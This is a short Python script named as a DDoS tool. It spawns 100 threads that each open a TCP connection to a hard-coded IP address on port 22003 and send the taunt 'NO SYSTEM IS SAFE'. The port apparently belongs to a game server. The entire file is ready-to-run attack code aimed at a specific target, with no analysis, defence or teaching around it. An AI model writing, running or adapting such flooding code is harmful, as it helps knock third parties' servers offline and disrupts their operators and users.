     # mta_ddos.py
import socket
import threading

def ddos(target, port, num_threads):
    def attack():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        sock.send(b"NO SYSTEM IS SAFE")
        sock.close()

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    target = "51.79.249.206"
    port = 22003
    num_threads = 100  # Adjust the number of threads as needed
    ddos(target, port, num_threads)
